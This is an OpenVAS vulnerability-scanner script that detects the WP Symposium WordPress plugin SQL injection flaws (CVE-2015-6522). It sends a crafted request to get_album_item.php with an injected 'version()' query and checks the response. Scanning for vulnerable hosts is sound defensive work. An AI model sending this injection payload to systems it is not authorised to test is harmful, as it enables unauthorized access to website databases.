###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wp_symposium_mult_sql_inj_vuln.nasl 11872 2018-10-12 11:22:41Z cfischer $
#
# WordPress WP Symposium Multiple SQL Injection Vulnerabilities
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806026");
  script_version("$Revision: 11872 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 13:22:41 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2015-08-24 15:13:35 +0530 (Mon, 24 Aug 2015)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("WordPress WP Symposium Multiple SQL Injection Vulnerabilities");
  script_cve_id("CVE-2015-6522");

  script_tag(name:"summary", value:"The host is installed with Wordpress
  WP Symposium plugin and is prone to multiple sql injection vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to execute sql query or not.");

  script_tag(name:"insight", value:"Multiple flaws are due to input validation
  errors in 'forum_functions.php' and 'get_album_item.php' in WP Symposium
  plugin.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to inject or manipulate SQL queries in the back-end database,
  allowing for the manipulation or disclosure of arbitrary data.");

  script_tag(name:"affected", value:"Wordpress WP Symposium Plugin version
  15.5.1 and probably all existing previous versions may also be affected.");

  script_tag(name:"solution", value:"Update to WP Symposium version 15.8 or
  later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/37824");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/37822");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"http://www.wpsymposium.com/");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

url = dir + '/wp-content/plugins/wp-symposium/get_album_item.php?size=version%28%29%20;%20--';

sndReq = http_get(item:url,  port:http_port);
rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
                   pattern:"([0-9.]+)",
                   extra_check:"Set-Cookie: PHPSESSID"))
{
  security_message(port:http_port);
  exit(0);
}
